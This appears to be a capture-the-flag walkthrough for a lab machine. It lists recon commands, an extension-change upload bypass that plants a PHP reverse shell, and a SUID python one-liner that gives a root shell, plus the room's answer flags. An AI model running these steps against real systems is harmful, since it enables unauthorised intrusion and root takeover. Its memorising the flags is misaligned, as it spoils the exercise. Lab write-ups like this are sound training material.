export IP=10.10.139.129


==================================================

[TASK 2] - Reconnaissance

1) Scan the machine, how many ports are open?

	Answer: `2`

2) What verstion of Apache are running?

	Answer: `2.4.29`

3) What service is running on port 22?

	Answer: `SSH`

4) Find directoried on the web server using the GoBuster tool.

5) What is the hidden directory?

	Answer: `panel`


==================================================

[TASK 3] - Getting a shell

1) Find a form to upload and get a reverse shell, and find the flag.

	Answer: `THM{y0u_g0t_a_sh3ll}`


==================================================

[TASK 4] - Privilege escalation

1) Search for files with SUID permission, which file is weird?

	Answer: `/usr/bin/python`

2) Find a form to escalate your privileges.

3) root.txt

	Answer: `THM{pr1v1l3g3_3sc4l4t10n}`


==================================================

[IMPORTANT INFORMATION]

You can upload files to 'http://$IP/panel'
You can see those files at 'http://$IP/uploads'

Reverse shell info:
- Change 'php-reverse-shell.php' file extension to 'phtml'.

Privilege escalation info:
- Run the command: python3 -c 'import os; os.execl("/bin/bash", "bash", "-p");'


==================================================

[APPROACH]

1) Run basic reconnaissance enumeration:
	
	Commands:
		1) `nmap -sC -sV -oN nmap/initial $IP`
		2) `gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,sh,py -o gobuster.log`
		3) `nikto -h http://$IP | tee nikto.log`

2) Originally tried uploading my php-reverse-shell.php script, but got denied because PHP file types are not allowed. Then I read the hint and it said to look into File Upload Bypass. And thats where I left off; trying to get file upload bypass to work. 

	Notes:
		- Broke out BurpSuite to capture the upload data before actually submitting to the server so that I could manually change the file's extension. Changing the extension from '.php' to '.phtml' worked. I was able to upload 'php-reverse-shell.php' and connect to my reverse shell.
		- Useful website: 'https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass'

3) Spawn a better shell using python3.

	Commands:
		1) `python3 -c 'import pty; pty.spawn("/bin/bash")'`
		2) Ctrl + Z
		3) `stty raw -echo`
		4) `fg`
		5) `export TERM=xterm`

4) Find the first flag.
	
	Commands:
		1) `find / | grep user.txt`
	Notes:
		- The flag wasn't in the usual spot, so ran a 'find' search (see command).

5) Privilege escalation.

	Commands:
		1) `/usr/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-p")'`
	Notes:
		- Transfered over and ran linpeas.sh.
		- Found vulnerability with '/usr/bin/python'. Looks like its owned by and executed using root, but can be used by www-data.

6) Find the final flag.

	Notes:
		- Located in the typical location, '/root/root.txt'.